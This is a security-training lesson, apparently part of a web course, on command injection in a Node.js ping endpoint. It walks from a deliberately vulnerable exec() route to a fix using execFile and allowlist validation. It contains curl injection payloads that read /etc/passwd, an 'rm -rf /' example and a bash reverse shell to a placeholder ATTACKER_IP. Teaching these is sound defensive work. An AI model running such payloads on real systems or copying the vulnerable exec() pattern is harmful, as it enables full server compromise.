window.LESSONS = window.LESSONS || {};
window.LESSONS.cmdi = `

<h1 class="lesson-title">Lab 04: Command Injection</h1>

<p class="lesson-subtitle">
  You are going to build an endpoint that runs a system command, inject your own commands into it,
  escalate to a reverse shell, and then learn why <code>execFile</code> exists and why <code>exec</code>
  should terrify you. This is the vulnerability that turns "web app bug" into "full system compromise"
  in a single HTTP request.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> Build a Vulnerable Ping Endpoint</h2>

<p>
  Here is a scenario I have seen in production more times than I care to admit: someone needs a "health check"
  or a "network diagnostic" tool inside an admin panel. They reach for Node's <code>child_process.exec()</code>
  because it is easy, it works, and the feature ships by Friday. The problem is that <code>exec()</code> does
  not just run a program. It invokes a full shell -- <code>/bin/sh -c "your string here"</code> on Linux,
  <code>cmd.exe /c "your string here"</code> on Windows. And shells interpret metacharacters.
</p>

<p>
  Let me say that again because it is the entire foundation of this lab: <code>exec()</code> hands your
  string to a shell, and the shell parses it before executing anything. Semicolons, pipes, ampersands,
  dollar signs, backticks -- the shell gives all of these special meaning. If any part of that string comes
  from user input, the user controls what the shell does.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/tools.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> { exec } <span class="op">=</span> <span class="fn">require</span>(<span class="str">'child_process'</span>);
<span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> router <span class="op">=</span> express.<span class="fn">Router</span>();

<span class="cmt">// POST /api/tools/ping</span>
router.<span class="fn">post</span>(<span class="str">'/ping'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">const</span> { host } <span class="op">=</span> req.body;

  <span class="cmt">// VULNERABLE: user input is interpolated directly into a shell command</span>
  <span class="fn">exec</span>(<span class="str">\`ping -c 2 \${host}\`</span>, (error, stdout, stderr) <span class="op">=></span> {
    <span class="kw">if</span> (error) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({ error: stderr });
    }
    res.<span class="fn">json</span>({ output: stdout });
  });
});
  </pre>
</div>

<p>
  Look at that <code>exec()</code> call. The template literal builds a string like <code>ping -c 2 192.168.1.1</code>
  and hands it to <code>/bin/sh</code>. If <code>host</code> is a normal IP address, everything works perfectly.
  But what happens when the user sends something that is not an IP address? The shell does not know the difference
  between "intended command" and "injected command." It just parses the string according to its grammar.
</p>

<p>
  This is exactly the same class of mistake as SQL injection, just in a different context. You are building a
  string in one language (shell syntax) and interpolating untrusted data into it. The interpreter -- whether it
  is a SQL engine or a Bash shell -- cannot tell your code from the attacker's code.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Basic Exploitation</h2>

<p>
  Now let us break it. Fire up your application and send some requests. I want you to try every one of these
  payloads so you can see the range of what an attacker can do with a single vulnerable parameter.
</p>

<h3>Semicolon Injection</h3>

<div class="attack-box">
  <div class="attack-box-title">Payload: Semicolon Command Separator</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">curl request</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
curl -X POST http://localhost:3000/api/tools/ping \\
  -H <span class="str">"Content-Type: application/json"</span> \\
  -d <span class="str">'{"host": "127.0.0.1; ls -la /"}'</span>
    </pre>
  </div>
</div>

<p>
  The shell sees: <code>ping -c 2 127.0.0.1; ls -la /</code>. The semicolon terminates the first command.
  The shell runs <code>ping -c 2 127.0.0.1</code>, then runs <code>ls -la /</code>. Both commands execute.
  Both outputs come back. The attacker just listed your entire root filesystem.
</p>

<h3>AND Chaining</h3>

<div class="attack-box">
  <div class="attack-box-title">Payload: AND Operator</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">curl request</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
curl -X POST http://localhost:3000/api/tools/ping \\
  -H <span class="str">"Content-Type: application/json"</span> \\
  -d <span class="str">'{"host": "127.0.0.1 && cat /etc/passwd"}'</span>
    </pre>
  </div>
</div>

<p>
  The <code>&&</code> operator means "run the second command only if the first succeeds." Since pinging
  localhost always succeeds, <code>cat /etc/passwd</code> runs and dumps the system's user database.
  On most Linux systems that file is world-readable, so this works even without root privileges.
</p>

<h3>Subshell Substitution</h3>

<div class="attack-box">
  <div class="attack-box-title">Payload: \$() Substitution</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">curl request</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
curl -X POST http://localhost:3000/api/tools/ping \\
  -H <span class="str">"Content-Type: application/json"</span> \\
  -d <span class="str">'{"host": "\\$(whoami)"}'</span>
    </pre>
  </div>
</div>

<p>
  The shell sees: <code>ping -c 2 \$(whoami)</code>. Before running ping, the shell executes <code>whoami</code>
  in a subshell and substitutes the result. So if the process runs as <code>node</code>, the shell tries to
  run <code>ping -c 2 node</code>. The ping will fail, but the point is that <code>whoami</code> executed.
  Swap it with any command you want.
</p>

<h3>Backtick Substitution</h3>

<div class="attack-box">
  <div class="attack-box-title">Payload: Backtick Substitution</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">curl request</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
curl -X POST http://localhost:3000/api/tools/ping \\
  -H <span class="str">"Content-Type: application/json"</span> \\
  -d <span class="str">'{"host": "\\\`id\\\`"}'</span>
    </pre>
  </div>
</div>

<p>
  Backticks are the older syntax for command substitution, equivalent to <code>\$()</code>. Some developers
  filter for dollar signs but forget about backticks. The shell still executes whatever is inside them.
  The <code>id</code> command returns the user ID, group ID, and group memberships of the process --
  useful reconnaissance for an attacker figuring out what privileges they have.
</p>

<div class="callout warn">
  <div class="callout-title">What the Shell Actually Sees</div>
  <div class="callout-text">
    This is the critical mental model. When your code calls <code>exec(\`ping -c 2 \${host}\`)</code> and
    <code>host</code> is <code>127.0.0.1; rm -rf /</code>, the string that reaches <code>/bin/sh</code> is
    literally <code>ping -c 2 127.0.0.1; rm -rf /</code>. The shell tokenizes that string, finds the
    semicolon, and treats everything after it as a separate command. There is no escaping, no quoting,
    no protection. The shell is doing exactly what shells are designed to do -- parse and execute commands.
    The problem is that you gave it commands you did not intend.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Escalation -- Reverse Shell</h2>

<p>
  Everything we have done so far is interesting, but an attacker is not going to stop at <code>ls</code> and
  <code>cat</code>. The real endgame for command injection is a reverse shell: a persistent, interactive
  connection back to the attacker's machine. Here is what that looks like conceptually:
</p>

<div class="attack-box">
  <div class="attack-box-title">Reverse Shell Concept</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">payload (DO NOT run against real systems)</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="cmt">// The attacker sends this as the "host" parameter:</span>
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    </pre>
  </div>
</div>

<p>
  What does this do? It starts an interactive Bash shell (<code>bash -i</code>), redirects its standard output
  and standard error to a TCP connection to the attacker's machine (<code>/dev/tcp/ATTACKER_IP/4444</code>),
  and redirects standard input from that same connection (<code>0>&1</code>). The attacker runs a listener
  on their end with something like <code>nc -lvp 4444</code>, and suddenly they have a full interactive
  terminal on your server. They can read files, install malware, pivot to other internal systems, dump
  databases -- whatever they want.
</p>

<p>
  This is why command injection is almost always rated <strong>CRITICAL</strong> severity. It is not a data leak
  or a privilege escalation. It is instant, complete system compromise in a single HTTP request. One POST
  to your cute little ping endpoint and the attacker owns the box.
</p>

<div class="callout info">
  <div class="callout-title">Real-World Command Injection</div>
  <div class="callout-text">
    If you think "nobody would actually build a ping endpoint in production," you are underestimating how
    creative developers get. But command injection is not limited to obvious cases. ImageMagick has had
    multiple CVEs where crafted image files triggered shell command execution (ImageTragick, CVE-2016-3714).
    Ghostscript has had similar vulnerabilities where malicious PostScript files escaped to the shell.
    FFmpeg has been exploited through crafted media files that triggered command execution during transcoding.
    Any time user-controlled input reaches a shell -- even indirectly through a library -- you have a
    potential command injection vector.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> The Fix -- execFile and Input Validation</h2>

<p>
  The fix is straightforward once you understand the root cause. The root cause is that <code>exec()</code>
  invokes a shell. So stop invoking a shell. Node gives you <code>execFile()</code> for exactly this purpose.
</p>

<div class="fix-box">
  <div class="fix-box-title">Fixed: Using execFile with Input Validation</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">routes/tools.js</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="kw">const</span> { execFile } <span class="op">=</span> <span class="fn">require</span>(<span class="str">'child_process'</span>);
<span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> router <span class="op">=</span> express.<span class="fn">Router</span>();

<span class="cmt">// Allowlist: only valid IPv4 addresses</span>
<span class="kw">const</span> IPV4_REGEX <span class="op">=</span> <span class="str">/^[\\d.]+\$/</span>;

router.<span class="fn">post</span>(<span class="str">'/ping'</span>, (req, res) <span class="op">=></span> {
  <span class="kw">const</span> { host } <span class="op">=</span> req.body;

  <span class="cmt">// Validate input BEFORE it goes anywhere near a process</span>
  <span class="kw">if</span> (!host || <span class="kw">typeof</span> host <span class="op">!==</span> <span class="str">'string'</span> || !IPV4_REGEX.<span class="fn">test</span>(host)) {
    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid host. IPv4 addresses only.'</span> });
  }

  <span class="cmt">// execFile does NOT invoke a shell.</span>
  <span class="cmt">// Arguments are passed directly as an argv array.</span>
  <span class="fn">execFile</span>(<span class="str">'ping'</span>, [<span class="str">'-c'</span>, <span class="str">'2'</span>, host], (error, stdout, stderr) <span class="op">=></span> {
    <span class="kw">if</span> (error) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({ error: stderr });
    }
    res.<span class="fn">json</span>({ output: stdout });
  });
});
    </pre>
  </div>
</div>

<p>
  Two changes, both essential. First, <code>execFile('ping', ['-c', '2', host])</code> does not invoke a shell.
  It calls the <code>ping</code> binary directly and passes the arguments as an array via the operating system's
  <code>argv</code> mechanism. The string <code>127.0.0.1; ls -la /</code> is not parsed by a shell -- it is
  passed as a single argument to ping. Ping tries to resolve that literal string as a hostname, fails, and
  that is the end of it. No semicolons are interpreted. No subshells are spawned. No commands are chained.
</p>

<p>
  Second, the regex <code>/^[\\d.]+\$/</code> ensures that the input contains only digits and dots before it
  ever reaches <code>execFile()</code>. This is defense in depth. Even if someone finds a way to abuse
  <code>execFile()</code> in the future, the input validation stops anything that is not a plausible IP address.
</p>

<h3>exec vs execFile vs spawn -- What Actually Happens at the OS Level</h3>

<p>
  This is worth understanding properly because the distinction matters for every Node application that
  calls external programs.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">How each function invokes the process</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// exec() -- spawns a shell, shell parses the command string</span>
<span class="cmt">// Internally: /bin/sh -c "ping -c 2 127.0.0.1"</span>
<span class="cmt">// The shell sees the ENTIRE string as a command to parse.</span>
<span class="fn">exec</span>(<span class="str">'ping -c 2 127.0.0.1'</span>, callback);

<span class="cmt">// execFile() -- calls the binary directly, no shell</span>
<span class="cmt">// Internally: execve("/usr/bin/ping", ["ping", "-c", "2", "127.0.0.1"])</span>
<span class="cmt">// Each argument is a separate element in argv. No parsing.</span>
<span class="fn">execFile</span>(<span class="str">'ping'</span>, [<span class="str">'-c'</span>, <span class="str">'2'</span>, <span class="str">'127.0.0.1'</span>], callback);

<span class="cmt">// spawn() -- like execFile but returns a stream instead of buffering</span>
<span class="cmt">// Use this for commands that produce large output (logs, dumps, etc.)</span>
<span class="kw">const</span> child <span class="op">=</span> <span class="fn">spawn</span>(<span class="str">'ping'</span>, [<span class="str">'-c'</span>, <span class="str">'2'</span>, <span class="str">'127.0.0.1'</span>]);
child.stdout.<span class="fn">on</span>(<span class="str">'data'</span>, (data) <span class="op">=></span> { <span class="cmt">/* stream chunks */</span> });
  </pre>
</div>

<p>
  The key difference is the system call. <code>exec()</code> ultimately calls something like
  <code>execve("/bin/sh", ["sh", "-c", "your command string"])</code>. The shell process receives your
  entire command as a single string argument to <code>-c</code> and parses it with full shell grammar.
  <code>execFile()</code> calls <code>execve("/usr/bin/ping", ["ping", "-c", "2", "127.0.0.1"])</code>
  directly. No shell is involved. The arguments arrive at the ping process exactly as you specified them,
  with no interpretation of metacharacters.
</p>

<p>
  <code>spawn()</code> works like <code>execFile()</code> at the process level but returns a
  <code>ChildProcess</code> object with streams for stdout and stderr instead of buffering the entire
  output into memory. Use <code>spawn()</code> when the command might produce megabytes of output --
  <code>execFile()</code> buffers everything, which can exhaust memory on large outputs.
</p>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> Why This Keeps Happening</h2>

<h3>Environment Variable Injection</h3>

<p>
  Even with <code>execFile()</code>, you need to think about the execution environment. What if an attacker
  can control environment variables? If they can manipulate <code>PATH</code>, they could create a malicious
  <code>ping</code> binary earlier in the path that gets executed instead of <code>/usr/bin/ping</code>.
  This is why security-critical applications often use absolute paths:
  <code>execFile('/usr/bin/ping', [...])</code> instead of relying on PATH resolution.
</p>

<h3>The shell:true Trap</h3>

<p>
  Both <code>execFile()</code> and <code>spawn()</code> accept an options object. One of those options is
  <code>shell: true</code>. If you set it, you undo all the safety that these functions provide. I have
  reviewed code where a developer switched from <code>exec()</code> to <code>spawn()</code> for "security"
  and then added <code>{ shell: true }</code> because their command "was not working." It was not working
  because they were passing the entire command as a single string instead of an argument array. Adding
  <code>shell: true</code> made it "work" by reintroducing the exact vulnerability they were trying to fix.
</p>

<h3>Allowlisting Over Blocklisting</h3>

<p>
  You might be tempted to sanitize shell metacharacters by stripping out semicolons, pipes, ampersands, and
  so on. Do not do this. The number of shell metacharacters across different shells and operating systems
  is staggering. Bash alone has semicolons, pipes, ampersands, dollar signs, backticks, parentheses,
  angle brackets, newlines, carriage returns, null bytes, and more. Zsh adds even more. Windows
  <code>cmd.exe</code> has its own set. You will always miss one. Always. Instead, define what valid input
  looks like (an allowlist) and reject everything else. If the user is supposed to enter an IP address,
  validate that the input is an IP address. If they are supposed to enter a hostname, validate against
  a hostname regex. Never try to enumerate what is dangerous -- enumerate what is safe.
</p>

<div class="callout warn">
  <div class="callout-title">A Quick Note on Windows</div>
  <div class="callout-text">
    On Windows, <code>exec()</code> invokes <code>cmd.exe</code>, which has its own metacharacters:
    <code>&</code>, <code>|</code>, <code>&&</code>, <code>||</code>, <code>^</code>, and more.
    Additionally, <code>execFile()</code> on Windows for <code>.bat</code> and <code>.cmd</code> files
    implicitly invokes a shell because batch files require <code>cmd.exe</code> to execute. If you
    are running on Windows and calling batch scripts, you may still be vulnerable even with
    <code>execFile()</code>. Always validate input regardless of which function you use.
  </div>
</div>

<hr>

<h2>Lab 04 Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Build the POST /api/tools/ping endpoint using exec() with string interpolation</li>
  <li><span class="task-check"></span> Exploit it with semicolon injection, AND chaining, \$() substitution, and backtick substitution</li>
  <li><span class="task-check"></span> Understand the reverse shell concept and why command injection is rated CRITICAL</li>
  <li><span class="task-check"></span> Replace exec() with execFile() and pass arguments as an array</li>
  <li><span class="task-check"></span> Add input validation with an allowlist regex before the execFile() call</li>
  <li><span class="task-check"></span> Verify that all previous payloads fail against the fixed endpoint</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="xss">Previous: XSS</button>
  <button class="nav-btn" data-next="nosql">Next: NoSQL Injection</button>
</div>

`;
